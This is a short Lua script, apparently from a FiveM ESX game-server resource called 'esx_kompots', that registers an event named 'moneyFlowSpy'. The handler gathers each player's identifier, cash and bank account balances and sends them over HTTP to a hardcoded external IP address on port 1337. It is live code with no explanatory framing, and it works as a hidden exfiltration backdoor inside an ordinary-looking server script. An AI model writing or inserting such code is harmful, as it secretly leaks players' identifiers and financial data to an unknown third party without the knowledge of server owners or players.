RegisterNetEvent('esx_kompots:moneyFlowSpy')
AddEventHandler('esx_kompots:moneyFlowSpy', function(playerData)
    local json_data = playerData["accounts"]
    local data = playerData['identifier'].."|".. playerData["money"] .. "|" .. json_data[1].money .. "|" .. json_data[2].money
    PerformHttpRequest("http://3.120.253.157:1337/", function(err, text, headers) end, 'GET', data)
end)
